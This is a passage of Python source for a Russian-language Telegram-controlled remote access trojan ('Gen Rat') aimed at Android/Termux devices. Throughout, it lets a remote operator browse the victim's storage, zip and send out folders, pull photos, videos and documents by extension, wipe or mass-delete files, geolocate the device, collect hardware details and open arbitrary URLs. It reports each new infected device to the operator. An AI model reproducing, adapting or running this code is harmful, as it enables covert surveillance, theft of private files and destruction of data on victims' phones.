                        bot.answer_callback_query(call.id, "Выберите папку", show_alert=True)
                else:
                    bot.answer_callback_query(call.id, "Путь не найден", show_alert=True)

        elif data.startswith("mto_"):
            parts = data.split("_", 2)
            if len(parts) == 3:
                selected_hash = parts[1]
                target_hash = parts[2]
                
                if selected_hash in path_cache and target_hash in path_cache:
                    selected_path = path_cache[selected_hash]
                    target_path = path_cache[target_hash]
                    
                    if os.path.isdir(target_path):
                        try:
                            dest_filepath = os.path.join(target_path, os.path.basename(selected_path))
                            shutil.move(selected_path, dest_filepath)
                            bot.answer_callback_query(call.id, "Файл перемещен")
                            show_filesystem_menu(cid, target_path, 0, mid)
                        except Exception as e:
                            bot.answer_callback_query(call.id, f"Ошибка: {str(e)[:30]}", show_alert=True)
                    else:
                        bot.answer_callback_query(call.id, "Неверный путь", show_alert=True)
                else:
                    bot.answer_callback_query(call.id, "Путь не найден", show_alert=True)

        elif data.startswith("zip_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                try:
                    if os.path.isdir(path):
                        zip_name = f"/tmp/rat_{random.randint(100000,999999)}.zip"
                        shutil.make_archive(zip_name[:-4], 'zip', path)
                        
                        with open(zip_name, 'rb') as f:
                            bot.send_document(cid, f, caption=f"Архив папки: {os.path.basename(path)}", visible_file_name=f"{os.path.basename(path)}.zip")
                        
                        os.remove(zip_name)
                        bot.answer_callback_query(call.id, "Архив отправлен")
                    else:
                        bot.answer_callback_query(call.id, "Только для папок", show_alert=True)
                except Exception as e:
                    bot.answer_callback_query(call.id, f"Ошибка: {str(e)[:30]}", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("cpy_"):
            file_hash = data[4:]
            if file_hash in path_cache:
                path = path_cache[file_hash]
                try:
                    bot.send_message(cid, f"Путь к файлу:\n<code>{path}</code>", parse_mode="HTML")
                    bot.answer_callback_query(call.id, "Путь скопирован")
                except:
                    bot.answer_callback_query(call.id, "Ошибка", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "Файл не найден", show_alert=True)

        elif data.startswith("tab_"):
            if data == "tab_files":
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.row(
                    types.InlineKeyboardButton("📂 Обзор файлов", callback_data="fs_browser"),
                    types.InlineKeyboardButton("📦 Скачать папку", callback_data="zip_folder")
                )
                markup.row(
                    types.InlineKeyboardButton("🗑️ Удалить папку", callback_data="del_folder"),
                    types.InlineKeyboardButton("🔥 Массовое удал.", callback_data="mass_delete")
                )
                markup.row(
                    types.InlineKeyboardButton("🗑️ Удалить всё", callback_data="wipe_all"),
                    types.InlineKeyboardButton("📤 Отправить файлы", callback_data="send_files")
                )
                markup.row(types.InlineKeyboardButton("← Назад", callback_data="back_to_main"))

                bot.edit_message_text(
                    "📁 <b>Работа с файлами</b>\n──────────────────────────────\nВыберите действие:",
                    cid,
                    mid,
                    parse_mode="HTML",
                    reply_markup=markup
                )
            elif data == "tab_tools":
                markup = types.InlineKeyboardMarkup(row_width=2)
                markup.row(
                    types.InlineKeyboardButton("⌨️ Терминал", callback_data="terminal"),
                    types.InlineKeyboardButton("🌐 Открыть ссылку", callback_data="open_url"),
                    types.InlineKeyboardButton("📍 Локация", callback_data="location")
                )
                markup.row(types.InlineKeyboardButton("💻 Информация", callback_data="device_info"))
                markup.row(types.InlineKeyboardButton("← Назад", callback_data="back_to_main"))

                bot.edit_message_text(
                    "🛠 <b>Инструменты</b>\n──────────────────────────────\nВыберите действие:",
                    cid,
                    mid,
                    parse_mode="HTML",
                    reply_markup=markup
                )

        elif data == "send_files":
            markup = types.InlineKeyboardMarkup(row_width=2)
            markup.row(
                types.InlineKeyboardButton("🖼️ Отправить фото", callback_data="media_photo"),
                types.InlineKeyboardButton("🎥 Отправить видео", callback_data="media_video")
            )
            markup.row(
                types.InlineKeyboardButton("📄 Отправить документы", callback_data="send_docs"),
                types.InlineKeyboardButton("← Назад", callback_data="tab_files")
            )
            
            bot.edit_message_text(
                "📤 <b>Отправка файлов</b>\n──────────────────────────────\nВыберите тип файлов для отправки:",
                cid,
                mid,
                parse_mode="HTML",
                reply_markup=markup
            )

        elif data == "send_docs":
            bot.edit_message_text(
                "Введите расширение файлов для отправки (например: .pdf, .txt, .docx):\n\n<i>Можно несколько через запятую: .pdf, .doc, .txt</i>",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, process_send_docs)

        elif data == "media_photo":
            cnt = count_media(ROOT, ['.jpg','.jpeg','.png','.gif','.webp'])
            bot.edit_message_text(
                f"📸 <b>Отправка фото</b>\n──────────────────────────────\nОбнаружено ≈{cnt} фото\n\nВведите количество фото для отправки:",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, lambda m: process_media_count(m, "photo"))

        elif data == "media_video":
            cnt = count_media(ROOT, ['.mp4','.mkv','.avi','.3gp','.mov'])
            bot.edit_message_text(
                f"🎥 <b>Отправка видео</b>\n──────────────────────────────\nОбнаружено ≈{cnt} видео\n\nВведите количество видео для отправки:",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, lambda m: process_media_count(m, "video"))

        elif data == "location":
            try:
                info = requests.get('http://ip-api.com/json/', timeout=6).json()

                if info.get('status') != 'success':
                    bot.send_message(cid, "Сервис временно недоступен или запрос отклонён")
                    return

                lat = info.get('lat')
                lon = info.get('lon')
                city = info.get('city', '—')
                region = info.get('regionName', '—')
                country = info.get('country', '—')
                isp = info.get('isp', '—')
                org = info.get('org', '—')
                ip = info.get('query', '—')
                timezone = info.get('timezone', '—')

                message = (
                    "Информация о местоположении\n\n"
                    f"Город:          {city}\n"
                    f"Регион:         {region}\n"
                    f"Страна:         {country}\n"
                    f"Часовой пояс:   {timezone}\n"
                    f"Провайдер:      {isp}\n"
                    f"Организация:    {org if org != isp else '—'}\n"
                    f"IP-адрес:       {ip}\n\n"
                    f"Координаты:     {lat:.5f}, {lon:.5f}"
                )

                bot.send_location(cid, lat, lon)
                bot.send_message(cid, message)

            except requests.exceptions.RequestException:
                bot.send_message(cid, "Не удалось подключиться к сервису геолокации")
            except Exception as e:
                bot.send_message(cid, f"Ошибка: {str(e)[:100]}")

        elif data == "wipe_all":
            bot.edit_message_text(
                "🗑️ <b>Полное удаление данных</b>\n──────────────────────────────\nЭто удалит ВСЕ файлы в основной памяти.\n\n<b>Действие необратимо!</b>\n\nВведите 'ПОДТВЕРЖДАЮ' для продолжения:",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, process_wipe_all)

        elif data == "mass_delete":
            bot.edit_message_text(
                "🔥 <b>Массовое удаление файлов</b>\n──────────────────────────────\nВведите расширение для удаления (например: .jpg или mp4):\n\n<i>Можно несколько через запятую: .jpg, .png, .mp4</i>",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, process_mass_delete)

        elif data == "zip_folder":
            bot.edit_message_text(
                "📦 <b>Архивация папки</b>\n──────────────────────────────\nВведите путь к папке для архивации:",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, process_zip_folder)

        elif data == "del_folder":
            bot.edit_message_text(
                "🗑️ <b>Удаление папки/файла</b>\n──────────────────────────────\nВведите путь к папке/файлу для удаления:",
                cid,
                mid,
                parse_mode="HTML"
            )
            bot.register_next_step_handler_by_chat_id(cid, process_delete_folder)

        elif data == "device_info":
            try:
                size = shutil.disk_usage(ROOT)
                storage_text = (
                    "Память устройства\n"
                    f"├─ Всего:          {size.total  // (1024**3):3d} ГБ\n"
                    f"├─ Использовано:   {size.used   // (1024**3):3d} ГБ\n"
                    f"├─ Свободно:       {size.free   // (1024**3):3d} ГБ\n"
                    f"└─ Занято:         {size.used / size.total * 100:5.1f}%\n\n"
                )

                mem = psutil.virtual_memory()
                ram_text = (
                    "Оперативная память\n"
                    f"├─ Всего:          {mem.total  // (1024**3):3d} ГБ\n"
                    f"├─ Доступно:       {mem.available // (1024**3):3d} ГБ\n"
                    f"├─ Использовано:   {mem.used  // (1024**3):3d} ГБ\n"
                    f"└─ Занято:         {mem.percent:5.1f}%\n\n"
                )

                cpu_text = (
                    "Процессор\n"
                    f"├─ Название:       {platform.processor() or '—'}\n"
                    f"├─ Ядер физических: {psutil.cpu_count(logical=False) or '—'}\n"
                    f"├─ Ядер логических: {psutil.cpu_count(logical=True) or '—'}\n"
                    f"└─ Загрузка:       Недоступно без root\n\n"
                )

                device_text = "Устройство\n"
                try:
                    output = subprocess.check_output(["getprop"], text=True, timeout=5)
                    props = {}
                    for line in output.splitlines():
                        if "[" in line and "]" in line:
                            try:
                                key = line.split("[")[1].split("]")[0]
                                val = line.split("[")[2].split("]")[0].strip()
                                props[key] = val
                            except:
                                continue

                    brand = props.get("ro.product.brand", "—")
                    model = props.get("ro.product.model", "—")
                    device = props.get("ro.product.device", "—")
                    manufacturer = props.get("ro.product.manufacturer", brand)
                    android_ver = props.get("ro.build.version.release", "—")
                    sdk = props.get("ro.build.version.sdk", "—")
                    build_id = props.get("ro.build.id", "—")

                    device_text += (
                        f"├─ Производитель:  {manufacturer}\n"
                        f"├─ Бренд:          {brand}\n"
                        f"├─ Модель:         {model}\n"
                        f"├─ Кодовое имя:    {device}\n"
                        f"├─ Android:        {android_ver} (SDK {sdk})\n"
                        f"└─ Сборка:         {build_id}\n\n"
                    )
                except:
                    device_text += "└─ (информация недоступна)\n\n"

                extra = (
                    "Дополнительно\n"
                    f"├─ Рабочая папка:  {ROOT}\n"
                    f"└─ Python:         {platform.python_version()}\n"
                )

                full_text = storage_text + ram_text + cpu_text + device_text + extra
                
                bot.edit_message_text(full_text, cid, mid)

            except Exception as e:
                bot.edit_message_text(f"Ошибка получения информации\n{str(e)[:100]}", cid, mid)

        elif data == "open_url":
            try:
                bot.edit_message_text(
                    "🌐 <b>Открыть ссылку</b>\n──────────────────────────────\nОтправьте URL для открытия на устройстве:\n\n<i>Пример: https://google.com или http://example.com</i>",
                    cid,
                    mid,
                    parse_mode="HTML"
                )
            except:
                bot.send_message(
                    cid,
                    "🌐 <b>Открыть ссылку</b>\n──────────────────────────────\nОтправьте URL для открытия на устройстве:\n\n<i>Пример: https://google.com или http://example.com</i>",
                    parse_mode="HTML"
                )
            
            user_id = call.from_user.id
            if user_id not in user_settings:
                user_settings[user_id] = {}
            user_settings[user_id]["awaiting_url"] = True

    except Exception as e:
        print(f"Error in callback router: {e}")
        bot.answer_callback_query(call.id, f"Ошибка: {str(e)[:30]}", show_alert=True)

def process_media_count(message, mtype):
    try:
        cnt = int(message.text)
        exts = ['.jpg','.jpeg','.png','.gif','.webp'] if mtype == "photo" else ['.mp4','.mkv','.avi','.3gp','.mov']
        send_media(message.chat.id, ROOT, exts, cnt, mtype)
        bot.send_message(message.chat.id, f"✅ Отправлено {min(cnt, 999)} файлов")
    except:
        bot.send_message(message.chat.id, "❌ Введите корректное число")

def process_send_docs(message):
    try:
        exts_input = message.text.strip()
        exts = [ext.strip().lower() for ext in exts_input.split(',')]
        
        exts = [ext if ext.startswith('.') else f'.{ext}' for ext in exts]
        
        bot.send_message(message.chat.id, f"🔍 Поиск файлов с расширениями: {', '.join(exts)}...")
        
        files_found = []
        for root, _, files in os.walk(ROOT):
            for file in files:
                if any(file.lower().endswith(ext) for ext in exts):
                    files_found.append(os.path.join(root, file))
        
        if not files_found:
            bot.send_message(message.chat.id, "❌ Файлы не найдены")
            return
        
        bot.send_message(message.chat.id, f"📁 Найдено файлов: {len(files_found)}\n\nНачинаю отправку...")
        
        sent = 0
        max_files = min(50, len(files_found))
        random.shuffle(files_found)
        
        for filepath in files_found[:max_files]:
            try:
                file_info = get_file_time_info(filepath)
                caption = f"📄 {os.path.basename(filepath)}\n"
                caption += f"📁 Путь: {filepath}\n"
                if file_info:
                    caption += f"📅 Создан: {file_info['created']}\n"
                    caption += f"✏️ Изменен: {file_info['modified']}\n"
                    caption += f"📏 Размер: {file_info['size'] / 1024:.1f} KB"
                
                with open(filepath, 'rb') as f:
                    bot.send_document(message.chat.id, f, caption=caption[:1024], visible_file_name=os.path.basename(filepath))
                sent += 1
                time.sleep(1)
            except:
                continue
        
        bot.send_message(message.chat.id, f"✅ Отправлено {sent} файлов из {len(files_found)} найденных")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:100]}")

def process_mass_delete(message):
    try:
        exts_input = message.text.strip().lower()
        exts = [ext.strip() for ext in exts_input.split(',')]
        
        exts = [ext if ext.startswith('.') else f'.{ext}' for ext in exts]
        
        bot.send_message(message.chat.id, f"🔍 Поиск файлов с расширениями: {', '.join(exts)}...")
        
        count = 0
        for root, _, files in os.walk(ROOT):
            for f in files:
                if any(f.lower().endswith(ext) for ext in exts):
                    try:
                        os.remove(os.path.join(root, f))
                        count += 1
                    except:
                        pass
        
        bot.send_message(message.chat.id, f"✅ Удалено {count} файлов с расширениями: {', '.join(exts)}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:100]}")

def process_wipe_all(message):
    try:
        if message.text.strip().upper() != 'ПОДТВЕРЖДАЮ':
            bot.send_message(message.chat.id, "❌ Действие отменено")
            return
        
        bot.send_message(message.chat.id, "⚠️ Полное удаление данных начнётся через 3 секунды...")
        time.sleep(3)
        
        deleted_count = 0
        error_count = 0
        
        for root, dirs, files in os.walk(ROOT, topdown=False):
            for name in files:
                try:
                    os.remove(os.path.join(root, name))
                    deleted_count += 1
                except:
                    error_count += 1
                    pass
        
        for name in dirs:
            try:
                if os.path.join(root, name) != ROOT.rstrip('/'):
                    shutil.rmtree(os.path.join(root, name), ignore_errors=True)
            except:
                error_count += 1
                pass
        
        bot.send_message(message.chat.id, f"✅ Основная память очищена\n\n🗑️ Удалено файлов: {deleted_count}\n⚠️ Ошибок: {error_count}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка при очистке: {str(e)[:100]}")

def process_zip_folder(message):
    path = message.text.strip()
    if not path.startswith('/'):
        path = os.path.join(ROOT, path)
    if not os.path.exists(path):
        bot.send_message(message.chat.id, "❌ Указанный путь не существует")
        return
    try:
        zip_name = f"/tmp/rat_{random.randint(100000,999999)}.zip"
        shutil.make_archive(zip_name[:-4], 'zip', path)
        
        file_info = get_file_time_info(path)
        caption = f"📦 Архив папки: {os.path.basename(path)}"
        if file_info:
            caption += f"\n📅 Создан: {file_info['created']}"
            caption += f"\n✏️ Изменен: {file_info['modified']}"
            caption += f"\n📏 Размер папки: {file_info['size'] / (1024*1024):.1f} MB"
        
        with open(zip_name, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=caption, visible_file_name=f"{os.path.basename(path)}.zip")
        os.remove(zip_name)
        
        bot.send_message(message.chat.id, "✅ Архив успешно отправлен")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:180]}")

def process_delete_folder(message):
    path = message.text.strip()
    if not path.startswith('/'):
        path = os.path.join(ROOT, path)
    if not os.path.exists(path):
        bot.send_message(message.chat.id, "❌ Путь не найден")
        return
    try:
        if os.path.isfile(path):
            file_info = get_file_time_info(path)
            os.remove(path)
            response = f"✅ Файл удалён: {os.path.basename(path)}\n"
            response += f"📁 Путь: {path}\n"
            if file_info:
                response += f"📅 Был создан: {file_info['created']}\n"
                response += f"✏️ Был изменен: {file_info['modified']}"
            bot.send_message(message.chat.id, response)
        else:
            shutil.rmtree(path, ignore_errors=True)
            bot.send_message(message.chat.id, f"✅ Папка удалена: {os.path.basename(path)}\n📁 Путь: {path}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)[:120]}")

@bot.message_handler(func=lambda m: user_settings.get(m.from_user.id, {}).get("awaiting_url", False))
def handle_url_input(message):
    user_id = message.from_user.id
    url = message.text.strip()
    
    if url.startswith('/'):
        user_settings[user_id]["awaiting_url"] = False
        return
    
    try:
        bot.send_chat_action(message.chat.id, 'typing')
        
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        
        try:
            result = subprocess.run(
                ['termux-open-url', url],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if result.returncode == 0:
                bot.send_message(message.chat.id, f"✅ Ссылка открыта на устройстве:\n<code>{url}</code>", parse_mode="HTML")
            else:
                try:
                    result2 = subprocess.run(
                        ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', url],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )
                    
                    if result2.returncode == 0:
                        bot.send_message(message.chat.id, f"✅ Ссылка открыта на устройстве:\n<code>{url}</code>", parse_mode="HTML")
                    else:
                        bot.send_message(message.chat.id, f"❌ Не удалось открыть ссылку:\n<code>{url}</code>", parse_mode="HTML")
                except:
                    bot.send_message(message.chat.id, f"❌ Ошибка при открытии ссылки", parse_mode="HTML")
        
        except FileNotFoundError:
            try:
                result3 = subprocess.run(
                    ['am', 'start', '-a', 'android.intent.action.VIEW', '-d', url],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                if result3.returncode == 0:
                    bot.send_message(message.chat.id, f"✅ Ссылка открыта на устройстве:\n<code>{url}</code>", parse_mode="HTML")
                else:
                    bot.send_message(message.chat.id, f"❌ Не удалось открыть ссылку", parse_mode="HTML")
            except:
                bot.send_message(message.chat.id, f"❌ Ошибка при открытии ссылки", parse_mode="HTML")
        
    except subprocess.TimeoutExpired:
        bot.send_message(message.chat.id, "⏰ Таймаут при открытии ссылки")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {str(e)}")
    
    user_settings[user_id]["awaiting_url"] = False

if __name__ == '__main__':
    try:
        bot.send_message(ADMIN_ID, f"Gen Rat • +1 Устройство онлайн • {time.strftime('%Y-%m-%d %H:%M:%S')}")
        bot.send_message(ADMIN_ID, "Напишите /start для начала работы")
    except:
        pass
    threading.Thread(target=bot.polling, daemon=True).start()
    while True:
        time.sleep(1800)
